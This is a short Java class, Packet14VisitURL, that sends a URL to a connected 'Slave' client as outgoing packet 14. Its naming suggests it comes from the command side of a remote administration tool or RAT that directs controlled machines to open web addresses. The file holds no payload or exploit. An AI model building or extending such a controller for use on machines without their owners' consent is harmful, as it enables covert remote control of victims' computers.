package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet14VisitURL extends AbstractOutgoingPacket {
	
	private String url;
	
	public Packet14VisitURL(String url) {
		this.url = url;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
	}

	@Override
	public byte getPacketId() {
		return 14;
	}

}
